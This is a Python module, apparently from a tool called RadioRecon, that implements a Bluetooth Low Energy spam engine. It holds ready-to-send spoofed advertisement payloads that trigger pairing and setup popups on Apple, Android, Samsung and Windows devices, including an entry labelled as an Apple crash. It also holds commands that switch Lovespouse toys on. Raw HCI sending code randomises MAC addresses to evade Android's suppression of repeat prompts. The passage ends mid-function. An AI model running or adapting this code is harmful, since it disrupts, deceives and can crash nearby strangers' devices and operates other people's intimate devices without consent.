"""RadioRecon — BLE Spam Engine V4.

Correct advertisement payloads per platform.
Uses PyBluez raw HCI socket — MUST stop BlueZ first to avoid interference.

Engine priority:
  1) ESP32 NimBLE (best — direct radio, no BlueZ)
  2) PyBluez raw HCI + bluetoothd stop (Linux)
  3) Error with instructions
"""
from __future__ import annotations
import time
import random
import logging
import threading
import struct
import subprocess
from datetime import datetime

logger = logging.getLogger("radiorecon.ble_spam")

# ═══════════════════════════════════════════════════════════
# FULL ADVERTISEMENT DATA — ready to send as-is via HCI
# These are the COMPLETE advertising data bytes including
# length, type, and company ID headers.
# ═══════════════════════════════════════════════════════════

# Apple Continuity (company ID 0x004C), exact AppleJuice-compatible AD payloads.
APPLE = [
    ("AirPods",            bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
    ("AirPods Pro",        bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
    ("AirPods Max",        bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
    ("AirPods Gen 2",      bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
    ("AirPods Gen 3",      bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
    ("AirPods Pro Gen 2",  bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
    ("Beats Studio Buds",  bytes([0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])),
]

# Google Fast Pair — Service UUID 0xFE2C + 3-byte Model ID
# CRITICAL: the service data UUID bytes must be LE: 0x2C 0xFE
# Real Model IDs from Google's Fast Pair database
# Fast Pair payloads — correct Google spec format:
# [0x06][0x16][0x2C][0xFE][model_b0][model_b1][model_b2]
# AD type 0x16 = Service Data, UUID 0xFE2C (little-endian), then 3-byte model ID
# Apple Action Modal payloads (type 0x0F — full-screen iOS popups)
APPLE_ACTION = [
    ("Setup New iPhone",  bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
    ("AppleTV Setup",     bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
    ("AppleTV HomeKit",   bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
    ("Transfer Number",   bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
    ("AppleTV Keyboard",  bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
    ("AppleTV UserAdd",   bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
    ("WiFi Password",     bytes([0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00])),
]

# Apple Crash / SourApple
APPLE_CRASH = [("SourApple", APPLE[0][1])]

# Lovespouse payloads
LOVE_ON  = bytes([0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x64,0x01])
LOVE_OFF = bytes([0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x00,0x01])


# ═══════════════════════════════════════════════════════════
# MODULE-LEVEL PAYLOAD CONSTANTS (HCI + ESP32 shared)
# ═══════════════════════════════════════════════════════════

GFASTPAIR = [
    [0x06,0x16,0x2C,0xFE,0x10,0xC4,0x52],  # Sony WH-1000XM5
    [0x06,0x16,0x2C,0xFE,0x8B,0x66,0xAB],  # Pixel Buds Pro
    [0x06,0x16,0x2C,0xFE,0x2D,0x7A,0x23],  # Pixel Buds A
    [0x06,0x16,0x2C,0xFE,0xF5,0x24,0x94],  # Bose QC Ultra
    [0x06,0x16,0x2C,0xFE,0xCD,0x82,0x56],  # JBL Flip 6
    [0x06,0x16,0x2C,0xFE,0xD0,0xF7,0x00],  # Nothing Ear 1
    [0x06,0x16,0x2C,0xFE,0x0E,0xB4,0x00],  # JBL Tune 760NC
    [0x06,0x16,0x2C,0xFE,0xAA,0xC5,0x00],  # Galaxy Buds2
    [0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC],  # Galaxy Buds Live
    [0x06,0x16,0x2C,0xFE,0x72,0xEF,0x22],  # Galaxy Buds Pro
    [0x06,0x16,0x2C,0xFE,0x0A,0x02,0x20],  # Pixel Buds Pro 2
    [0x06,0x16,0x2C,0xFE,0x28,0x8B,0x2F],  # Galaxy Buds FE
    [0x06,0x16,0x2C,0xFE,0x65,0xCD,0x00],  # Galaxy Buds3
    [0x06,0x16,0x2C,0xFE,0xD4,0xF5,0x7E],  # Sony WH-1000XM5 (alt)
    [0x06,0x16,0x2C,0xFE,0x7E,0xF4,0x54],  # Beats Fit Pro
    [0x06,0x16,0x2C,0xFE,0x36,0xA9,0x4B],  # Beats Studio Buds
]
GFASTPAIR_N = len(GFASTPAIR)
GFASTPAIR_NAMES = [
    "Sony WH-1000XM5","Pixel Buds Pro","Pixel Buds A-Series",
    "Bose QC Ultra","JBL Flip 6","Nothing Ear (1)","JBL Tune 760NC",
    "Galaxy Buds2","Galaxy Buds Live","Galaxy Buds Pro",
    "Pixel Buds Pro 2","Galaxy Buds FE","Galaxy Buds3",
    "Sony WH-1000XM5 (B)","Beats Fit Pro","Beats Studio Buds",
]

SBUDS = [
    [0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC],  # Galaxy Buds Live
    [0x06,0x16,0x2C,0xFE,0xAA,0xC5,0x00],  # Galaxy Buds2
    [0x06,0x16,0x2C,0xFE,0x72,0xEF,0x22],  # Galaxy Buds Pro
    [0x06,0x16,0x2C,0xFE,0x28,0x8B,0x2F],  # Galaxy Buds FE
    [0x06,0x16,0x2C,0xFE,0x6D,0x13,0x00],  # Galaxy Buds2 Pro
    [0x06,0x16,0x2C,0xFE,0x65,0xCD,0x00],  # Galaxy Buds3
]
SBUDS_N = len(SBUDS)
SBUDS_NAMES = [
    "Galaxy Buds Live","Galaxy Buds2","Galaxy Buds Pro",
    "Galaxy Buds FE","Galaxy Buds2 Pro","Galaxy Buds3",
]

SWATCH = [
    [0x06,0x16,0x2C,0xFE,0x58,0xCF,0x07],  # Galaxy Watch 4
    [0x06,0x16,0x2C,0xFE,0x58,0xCF,0x59],  # Galaxy Watch 5
    [0x06,0x16,0x2C,0xFE,0x58,0xCF,0x73],  # Galaxy Watch 5 Pro
    [0x06,0x16,0x2C,0xFE,0x58,0xCF,0x99],  # Galaxy Watch 6
]
SWATCH_N = len(SWATCH)
SWATCH_NAMES = ["Galaxy Watch4","Galaxy Watch5","Galaxy Watch5 Pro","Galaxy Watch6"]

SEASY = [
    bytes([0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,
           0xef,0x74,0x5d,0x15,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00]),
    bytes([0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,
           0xef,0x74,0x5d,0x16,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00]),
    bytes([0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,
           0xef,0x74,0x5d,0x18,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00]),
    bytes([0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,
           0xef,0x74,0x5d,0x25,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00]),
]
SEASY_N = len(SEASY)

MSFT = [
    bytes([0x06,0xff,0x06,0x00,0x03,0x00,0x80]),
    bytes([0x06,0xff,0x06,0x00,0x03,0x00,0xc0]),
    bytes([0x06,0xff,0x06,0x00,0x03,0x00,0xa0]),
]
MSFT_N = len(MSFT)
MSFT_NAMES = ["BT Speaker","BT Controller","BT Headphones"]

ANDROID_FIXED_ATTACKS = {
    "android","android_random","samsung","samsung_buds",
    "samsung_watch","kitchen","all",
}


ANDROID = [
    # Google
    ("Pixel Buds Pro",   bytes([0x06,0x16,0x2C,0xFE,0x0A,0x02,0x20])),
    ("Pixel Buds A",     bytes([0x06,0x16,0x2C,0xFE,0x2D,0x7A,0x23])),
    # Samsung
    ("Galaxy Buds2 Pro", bytes([0x06,0x16,0x2C,0xFE,0x8E,0x71,0x7D])),
    ("Galaxy Buds Live", bytes([0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC])),
    ("Galaxy Buds FE",   bytes([0x06,0x16,0x2C,0xFE,0x28,0x8B,0x2F])),
    ("Galaxy Buds3",     bytes([0x06,0x16,0x2C,0xFE,0x65,0xCD,0x00])),
    # Sony
    ("Sony WH-1000XM5",  bytes([0x06,0x16,0x2C,0xFE,0xD4,0xF5,0x7E])),
    ("Sony WH-1000XM4",  bytes([0x06,0x16,0x2C,0xFE,0x10,0xC4,0x52])),
    ("Sony WF-1000XM5",  bytes([0x06,0x16,0x2C,0xFE,0xC4,0xAA,0xB8])),
    # Nothing
    ("Nothing Ear (1)",  bytes([0x06,0x16,0x2C,0xFE,0xD0,0xF7,0x00])),
    ("Nothing Ear (2)",  bytes([0x06,0x16,0x2C,0xFE,0xD0,0xF7,0x01])),
    # JBL
    ("JBL Flip 6",       bytes([0x06,0x16,0x2C,0xFE,0xCD,0x82,0x56])),
    ("JBL Tune 760NC",   bytes([0x06,0x16,0x2C,0xFE,0x0E,0xB4,0x00])),
    # Bose
    ("Bose QC Ultra",    bytes([0x06,0x16,0x2C,0xFE,0xF5,0x24,0x94])),
    # Beats
    ("Beats Studio Buds",bytes([0x06,0x16,0x2C,0xFE,0x36,0xA9,0x4B])),
    ("Beats Fit Pro",    bytes([0x06,0x16,0x2C,0xFE,0x7E,0xF4,0x54])),
    # Jabra
    ("Jabra Evolve65",   bytes([0x06,0x16,0x2C,0xFE,0x2C,0x1F,0x23])),
    # Anker
    ("Anker Q45",        bytes([0x06,0x16,0x2C,0xFE,0xA6,0xFC,0x00])),
]


def _random_android_payload():
    """Generate a correct Fast Pair advertising payload per Google specification.

    Google Fast Pair spec (provider advertising when discoverable):
      - AD Type: 0x16 = Service Data - 16-bit UUID
      - UUID: 0xFE2C (Fast Pair Service UUID, little-endian: 0x2C 0xFE)
      - Data: 3-byte Model ID (big-endian)
      
    Full AD structure: [len][0x16][0x2C][0xFE][model_b0][model_b1][model_b2]
    len = 6 (1 type + 2 UUID + 3 model)
    
    Random model IDs bypass Android's learned suppression.
    Known model IDs (for targeted exploits):
      0x0A0220 = Google Pixel Buds Pro
      0x8E717D = Samsung Galaxy Buds2 Pro  
      0xD4F57E = Sony WH-1000XM5
    """
    model = bytes([random.randint(0, 255) for _ in range(3)])
    # Correct Service Data format: len(6) + type(0x16) + UUID(0xFE2C LE) + model(3)
    return bytes([0x06, 0x16, 0x2C, 0xFE]) + model


def _make_fp_payload(model_id_hex: str) -> bytes:
    """Build Fast Pair advertising payload for a specific model ID."""
    model = bytes.fromhex(model_id_hex.replace("0x","").replace(" ","").zfill(6))[:3]
    return bytes([0x06, 0x16, 0x2C, 0xFE]) + model


# Known Fast Pair model IDs for targeted attacks
FAST_PAIR_MODELS = {
    "pixel_buds_pro":       "0A0220",
    "pixel_buds_a":         "2D7A23",
    "galaxy_buds2_pro":     "8E717D",
    "galaxy_buds_live":     "A59EFC",
    "galaxy_buds_fe":       "288B2F",
    "galaxy_buds3":         "65CD00",
    "sony_wh1000xm5":       "D4F57E",
    "sony_wf1000xm5":       "C4AAB8",
    "sony_wh1000xm4":       "10C452",
    "jbl_flip6":            "CD8256",
    "jbl_tune760nc":        "0EB400",
    "nothing_ear1":         "D0F700",
    "nothing_ear2":         "D0F701",
    "bose_qc_ultra":        "F52494",
    "jabra_evolve65":       "2C1F23",
    "anker_q45":            "A6FC00",
    "beats_studio_buds":    "36A94B",
    "beats_fit_pro":        "7EF454",
}

# Samsung EasySetup (company ID 0x0075)
SAMSUNG = [
    ("Galaxy Buds2 Pro", bytes.fromhex("1aff750042098102141503210109ef745d15000044010005000000")),
    ("Galaxy Buds Live",  bytes.fromhex("1aff750042098102141503210109ef745d16000044010005000000")),
    ("Galaxy Buds FE",    bytes.fromhex("1aff750042098102141503210109ef745d18000044010005000000")),
    ("Galaxy Watch4",     bytes.fromhex("1aff750042098102141503210109ef745d25000044010005000000")),
]

# Microsoft Swift Pair (company ID 0x0006)
WINDOWS = [
    ("Swift Pair",       bytes.fromhex("06ff060003"+"0080")),
    ("Xbox Controller",  bytes.fromhex("06ff060003"+"00c0")),
    ("Surface Audio",    bytes.fromhex("06ff060003"+"00a0")),
]


# ═══════════════════════════════════════════════════════════
# RAW HCI — send via PyBluez socket
# ═══════════════════════════════════════════════════════════

_bt_daemon_was_running = False


def _stop_bluetoothd():
    """Stop BlueZ daemon and release HCI adapter for raw socket access.

    BlueZ holds an exclusive lock on the HCI adapter while running.
    After stopping the daemon we also cycle hciconfig down/up so the
    kernel driver resets — otherwise raw HCI sockets still get EBUSY.
    """
    global _bt_daemon_was_running
    try:
        r = subprocess.run(["systemctl", "is-active", "bluetooth"],
                           capture_output=True, text=True, timeout=3)
        _bt_daemon_was_running = "active" in r.stdout
    except Exception:
        _bt_daemon_was_running = False

    if _bt_daemon_was_running:
        subprocess.run(["systemctl", "stop", "bluetooth"],
                       capture_output=True, timeout=5)
        time.sleep(0.5)

    # Cycle adapter to flush kernel-level BlueZ state
    try:
        from web_server import HCI_IFACE as _hi
    except Exception:
        _hi = "hci0"
    try:
        subprocess.run(["hciconfig", _hi, "down"], capture_output=True, timeout=3)
        time.sleep(0.2)
        subprocess.run(["hciconfig", _hi, "up"],   capture_output=True, timeout=3)
        time.sleep(0.3)
    except Exception:
        pass
    logger.info("HCI adapter released for raw spam (%s)", _hi)


def _restart_bluetoothd():
    """Restart BlueZ daemon after raw HCI operations."""
    global _bt_daemon_was_running
    if _bt_daemon_was_running:
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True, timeout=5)
        time.sleep(1)
        subprocess.run(["hciconfig", "hci0", "up"], capture_output=True, timeout=3)
        logger.info("Restarted bluetoothd")


def _hci_set_random_addr(sock, mode):
    """Set a fresh random MAC address on the HCI adapter."""
    addr = bytes([random.randint(0, 255) for _ in range(6)])
    # HCI command parameters carry BD_ADDR little-endian. Static random
    # address bits belong to the most significant address octet, which is the
    # last byte in this buffer.
    addr = addr[:5] + bytes([(addr[5] | 0xC0) & 0xFE])
    _hci_cmd(sock, mode, 0x08, 0x0005, addr)
    time.sleep(0.005)


def _hci_adv_stop(sock, mode):
    """Disable LE advertising."""
    try:
        _hci_cmd(sock, mode, 0x08, 0x000A, bytes([0x00]))
    except Exception:
        pass


def _hci_open(dev_id: int):
    """Open HCI socket — tries pybluez first, falls back to raw socket.
    
    Raw socket uses struct sockaddr_hci: {AF_BLUETOOTH, dev_id, HCI_CHANNEL_RAW=0}
    This requires bluetoothd to be stopped first (exclusive access).
    """
    try:
        import bluetooth._bluetooth as bluez
        sock = bluez.hci_open_dev(dev_id)
        return sock, "pybluez"
    except Exception:
        pass
    try:
        import socket as _sk
        import struct as _st
        sock = _sk.socket(_sk.AF_BLUETOOTH, _sk.SOCK_RAW, _sk.BTPROTO_HCI)
        # sockaddr_hci: family(2) + dev(2) + channel(2) — HCI_CHANNEL_RAW=0
        sock.bind(_st.pack("HHH", _sk.AF_BLUETOOTH, dev_id, 0))
        return sock, "socket"
    except Exception:
        return None, None


def _hci_cmd(sock, mode: str, ogf: int, ocf: int, params: bytes):
    """Send HCI command — works with both pybluez and raw socket.
    
    HCI command packet format:
      [0x01]              — HCI packet type: command
      [opcode_lo]         — opcode = (ogf<<10)|ocf, little-endian
      [opcode_hi]
      [param_len]         — length of params
      [params...]
    """
    if mode == "pybluez":
        try:
            import bluetooth._bluetooth as bluez
            bluez.hci_send_cmd(sock, ogf, ocf, params)
            return
        except Exception:
            pass
    # Raw socket mode
    opcode = ((ogf & 0x3F) << 10) | (ocf & 0x3FF)
    pkt = bytes([0x01,               # HCI_COMMAND_PKT
                 opcode & 0xFF,       # opcode LSB
                 (opcode >> 8) & 0xFF,# opcode MSB
                 len(params)])        # parameter total length
    pkt += params
    try:
        sock.sendall(pkt)
    except Exception as _e:
        logger.debug("HCI cmd error ogf=%02x ocf=%04x: %s", ogf, ocf, _e)


def _send_hci(dev_id: int, adv_data: bytes, sock=None, mode: str = "socket",
              hold_s: float = 0.12, interval: int = 0x00A0,
              random_addr: bool = False) -> bool:
    """Send one non-connectable BLE advertisement via raw HCI.
    Used for: Apple Continuity, Windows Swift Pair, Samsung EasySetup.
    Works with pybluez OR raw socket (no pybluez required).
    """
    _own_sock = sock is None
    if _own_sock:
        sock, mode = _hci_open(dev_id)
        if sock is None:
            return False
    try:
        _hci_adv_stop(sock, mode)
        own_addr_type = 0x01 if random_addr else 0x00
        if random_addr:
            _hci_set_random_addr(sock, mode)
        params = struct.pack("<HHBBB6sBB",
                             interval, interval, 0x03, own_addr_type, 0x00,
                             b"\x00" * 6, 0x07, 0x00)
        _hci_cmd(sock, mode, 0x08, 0x0006, params)
        time.sleep(0.005)
        data = adv_data[:31]
        cmd = bytes([len(data)]) + data + bytes(31 - len(data))
        _hci_cmd(sock, mode, 0x08, 0x0008, cmd)
        time.sleep(0.005)
        _hci_cmd(sock, mode, 0x08, 0x000A, bytes([0x01]))
        time.sleep(max(0.03, hold_s) + random.random() * 0.03)
        _hci_adv_stop(sock, mode)
        return True
    except Exception as e:
        logger.debug("HCI send error: %s", e)
        return False
    finally:
        if _own_sock:
            try: sock.close()
            except Exception: pass


def _send_hci_fastpair(dev_id: int, adv_data: bytes, scan_rsp: bytes = b"", sock=None, mode: str = "socket") -> bool:
    """Send one connectable BLE advertisement for Google Fast Pair / Samsung.

    Google Fast Pair spec:
    - ADV_IND (connectable) — triggers pairing popup
    - 100ms interval (0xA0) — mandatory per spec
    - Random MAC per packet — bypasses Android learned-suppression
    - SCAN_RSP with device name — Android reads this to confirm identity
    Works with pybluez OR raw socket.
    """
    _own_sock2 = sock is None
    if _own_sock2:
        sock, mode = _hci_open(dev_id)
        if sock is None:
            return False
    try:
        _hci_adv_stop(sock, mode)
        _hci_set_random_addr(sock, mode)
        params = struct.pack("<HHBBB6sBB",
                             0x00A0, 0x00A0, 0x00, 0x01, 0x00,
                             b"\x00" * 6, 0x07, 0x00)
        _hci_cmd(sock, mode, 0x08, 0x0006, params)
        time.sleep(0.005)
        data = adv_data[:31]
        cmd = bytes([len(data)]) + data + bytes(31 - len(data))
        _hci_cmd(sock, mode, 0x08, 0x0008, cmd)
        time.sleep(0.005)
        sr = (scan_rsp[:31] if scan_rsp else b"")
        sr_cmd = bytes([len(sr)]) + sr + bytes(31 - len(sr))
        _hci_cmd(sock, mode, 0x08, 0x0009, sr_cmd)
        time.sleep(0.005)
        _hci_cmd(sock, mode, 0x08, 0x000A, bytes([0x01]))
        time.sleep(0.22 + random.random() * 0.05)
        _hci_adv_stop(sock, mode)
        return True
    except Exception as e:
        logger.debug("HCI FastPair send error: %s", e)
        return False
    finally:
        if _own_sock2:
            try: sock.close()
            except Exception: pass


def _make_scan_rsp(name: str) -> bytes:
    """Build SCAN_RSP with Complete Local Name (AD type 0x09)."""
    n = name.encode("utf-8")[:29]
    return bytes([len(n) + 1, 0x09]) + n


def _make_fp_adv(model_id: bytes) -> bytes:
    """Build Fast Pair ADV_IND payload per Google spec.
    Flags + Service UUID 0xFE2C + Service Data + TX Power = 17 bytes.
    """
    return bytes([
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        model_id[0], model_id[1], model_id[2],
        0x02, 0x0A, 0x04,
    ])


# ═══════════════════════════════════════════════════════════
# SPAM ENGINE
# ═══════════════════════════════════════════════════════════

_spam_running = False
_spam_log = []
_spam_stats = {"packets": 0, "errors": 0, "started": None}
_persistent_esp32 = None  # Persistent ESP32 bridge — reused between spam calls
_persistent_esp32_port = None

def _web_server_module():
    """Return the live Flask module, including when web_server.py runs as __main__."""
    try:
        import sys
        for name in ("web_server", "__main__"):
            mod = sys.modules.get(name)
            if mod is not None and hasattr(mod, "esp32_bridge"):
                return mod
    except Exception:
        pass
    return None

ANDROID_FIXED_ATTACKS = {
    "android", "android_random", "samsung", "samsung_buds", "samsung_watch"
}


def _firmware_has_android_fix(bridge) -> tuple[bool, str]:
    """Check firmware supports correct Fast Pair / Samsung payloads.

    Strategy (in priority order):
    1. Use firmware version already cached in bridge._log (from connect())
    2. Send AT+VERSION and check response
    3. If serial port is open and connected → assume BLEAK compatible
    """
    import re as _re

    # 1. Check cached firmware version from connect() — avoids sending another command
    cached = ""
    try:
        for entry in reversed(bridge._log):
            if entry.get("msg", "").startswith("Connected:"):
                cached = entry["msg"].replace("Connected:", "").strip()
                break
        if not cached and hasattr(bridge, "_firmware"):
            cached = bridge._firmware or ""
    except Exception:
        pass

    if cached:
        if "BLEAK" in cached or "RadioRecon" in cached:
            return True, cached.split("\n")[0].strip()
        vm = _re.search(r"v(\d+)\.(\d+)", cached)
        if vm:
            major, minor = int(vm.group(1)), int(vm.group(2))
            if major >= 5 or (major == 4 and minor >= 1):
                return True, cached.split("\n")[0].strip()
        if "OK:" in cached:
            return True, cached.split("\n")[0].strip()

    # 2. Send AT+VERSION
    text = ""
    try:
        vr = bridge.send_command("AT+VERSION", timeout=3.0)
        text = (vr.get("raw_response", "") or vr.get("response", "") or "").strip()
        if not text:
            text = cached  # fallback to cached if AT+VERSION returned nothing

        if "BLEAK" in text or "RadioRecon" in text:
            return True, text.split("\n")[0].strip()
        vm = _re.search(r"v(\d+)\.(\d+)", text)
        if vm:
            major, minor = int(vm.group(1)), int(vm.group(2))
            if major >= 5 or (major == 4 and minor >= 1):
                return True, text.split("\n")[0].strip()
        if vr.get("success") or "OK:" in text:
            return True, text.split("\n")[0].strip() or "BLEAK (OK)"
    except Exception:
        pass

    # 3. Serial port is open → connected BLEAK device → assume compatible
    try:
        if bridge._connected and bridge._serial and bridge._serial.is_open:
            return True, cached or "BLEAK (connected)"
    except Exception:
        pass

    return False, (text or cached or "unknown").split("\n")[0].strip()


def _get_or_reconnect_esp32(known_port=None):
    """Get or reconnect a persistent ESP32Bridge.

    Reuses existing connection if still alive.
    On failure: flushes, closes, reconnects fresh.
    Uses VID-based port detection to prefer FT232 (S3) over other ports.
    Returns (bridge, port) or (None, None).
    """
    global _persistent_esp32, _persistent_esp32_port

    def _bridge_is_open(bridge):
        try:
            return bool(getattr(bridge, "connected", False) and
                        getattr(bridge, "_serial", None) and
                        bridge._serial.is_open)
        except Exception:
            return False

    # Try reusing existing connection (check with lightweight ping, not AT+STATUS)
    if _persistent_esp32 and _bridge_is_open(_persistent_esp32):
        return _persistent_esp32, _persistent_esp32_port
    if _persistent_esp32 and getattr(_persistent_esp32, "_connected", False):
        try:
            pr = _persistent_esp32.send_command("AT+STATUS", timeout=2.0)
            if pr.get("success"):
                return _persistent_esp32, _persistent_esp32_port
        except Exception:
            pass
        # Connection dead — close it
        try: _persistent_esp32.disconnect()
        except Exception: pass
        _persistent_esp32 = None

    # Flask keeps a global ESP32Bridge for the Debug/Test S3 panel. Reuse it
    # first; opening a second serial handle on /dev/ttyUSB0 can make AT+SPAM fail.
    try:
        _ws = _web_server_module()
        ws_bridge = getattr(_ws, "esp32_bridge", None)
        ws_port = getattr(_ws, "ESP32_PORT", None) or known_port
        if ws_bridge and _bridge_is_open(ws_bridge):
            _persistent_esp32 = ws_bridge
            _persistent_esp32_port = getattr(ws_bridge, "port", None) or ws_port
            return _persistent_esp32, _persistent_esp32_port
        if ws_bridge and getattr(ws_bridge, "connected", False):
            try:
                pr = ws_bridge.send_command("AT+STATUS", timeout=2.0)
                if pr.get("success"):
                    _persistent_esp32 = ws_bridge
                    _persistent_esp32_port = getattr(ws_bridge, "port", None) or ws_port
                    return _persistent_esp32, _persistent_esp32_port
            except Exception:
                pass
    except Exception:
        pass

    # Build port priority list
    try:
        import serial.tools.list_ports as _slp_r, glob as _gl_r
        rank = {0x0403: 0, 0x1A86: 1, 0x10C4: 2, 0x303A: 3}
        by_port = {}
        for p in _slp_r.comports():
            if getattr(p, 'vid', None) == 0x303A and getattr(p, 'pid', None) == 0x1001:
                continue
            if p.device.startswith("/dev/ttyUSB") or p.device.startswith("/dev/ttyACM"):
                by_port[p.device] = rank.get(getattr(p, 'vid', None), 9)
        for p in sorted(_gl_r.glob("/dev/ttyUSB*")) + sorted(_gl_r.glob("/dev/ttyACM*")):
            by_port.setdefault(p, 9)
        candidates = sorted(by_port, key=lambda p: (0 if p == known_port else 1, by_port[p], p))
    except Exception:
        import glob as _gl_r2
        candidates = sorted(_gl_r2.glob("/dev/ttyUSB*")) + sorted(_gl_r2.glob("/dev/ttyACM*"))

    for port in candidates:
        try:
            from esp32_serial_bridge import ESP32Bridge as _ESB
            bridge = _ESB(port)
            # Flush before connect
            try:
                import serial as _ser
                _s = _ser.Serial(port, 115200, timeout=0.5)
                _s.reset_input_buffer(); _s.reset_output_buffer()
                _s.close()
                time.sleep(0.2)
            except Exception:
                pass
            cr = bridge.connect(port, quick=True)
            if cr.get("success"):
                _persistent_esp32 = bridge
                _persistent_esp32_port = port
                logger.info("ESP32 connected (persistent) on %s: %s", port, cr.get("firmware","?"))
                return bridge, port
            try: bridge.disconnect()
            except Exception: pass
        except Exception as e:
            logger.debug("ESP32 connect failed on %s: %s", port, e)

    return None, None


def _get_payloads(attack_type: str) -> list:
    """Return list of (name, bytes) tuples for attack type.

    Used by both HCI path (Realtek) and ESP32 path.
    Each tuple: (display_name, raw_bytes)
    """
    t = attack_type.lower()

    if t == "android":
        # Alternate known model IDs (popup) + random (bypass suppression) — 3:1 ratio
        known = [(GFASTPAIR_NAMES[i], bytes(GFASTPAIR[i])) for i in range(GFASTPAIR_N)]
        rands = [("Android FP #{}".format(i), _random_android_payload()) for i in range(6)]
        return known + known + known + rands  # 3:1 ratio

    if t == "android_random":
        return [("Android random #{}".format(i), _random_android_payload()) for i in range(20)]

    if t in ("samsung", "samsung_buds"):
        buds = [(SBUDS_NAMES[i], bytes(SBUDS[i])) for i in range(SBUDS_N)]
        easy = [("Galaxy Buds (EasySetup)", SEASY[i]) for i in range(SEASY_N)]
        # Interleave: EasySetup every 3rd packet, Fast Pair for the rest
        result = []
        for i in range(SBUDS_N * 3):
            if i % 3 == 0: result.append(easy[i % SEASY_N])
            else: result.append(buds[i % SBUDS_N])
        return result

    if t == "samsung_watch":
        watches = [(SWATCH_NAMES[i], bytes(SWATCH[i])) for i in range(SWATCH_N)]
        easy = [("Galaxy Watch (EasySetup)", SEASY[3])]
        result = []
        for i in range(SWATCH_N * 3):
            if i % 3 == 0: result.append(easy[0])
            else: result.append(watches[i % SWATCH_N])
        return result

    if t == "windows":
        return [(MSFT_NAMES[i], MSFT[i]) for i in range(MSFT_N)]

    if t in ("kitchen", "all"):
        apple_pl = APPLE
        android_pl = [(GFASTPAIR_NAMES[i], bytes(GFASTPAIR[i])) for i in range(GFASTPAIR_N)]
        samsung_pl = [(SBUDS_NAMES[i], bytes(SBUDS[i])) for i in range(SBUDS_N)]
        windows_pl = [(MSFT_NAMES[i], MSFT[i]) for i in range(MSFT_N)]
        watch_pl = [(SWATCH_NAMES[i], bytes(SWATCH[i])) for i in range(SWATCH_N)]
        return apple_pl + android_pl + samsung_pl + windows_pl + watch_pl

    if t in ("lovespouse", "love"):
        return [("Lovespouse ON", LOVE_ON if isinstance(LOVE_ON, bytes) else bytes(LOVE_ON))]

    if t in ("love_stop", "lovespouse_stop"):
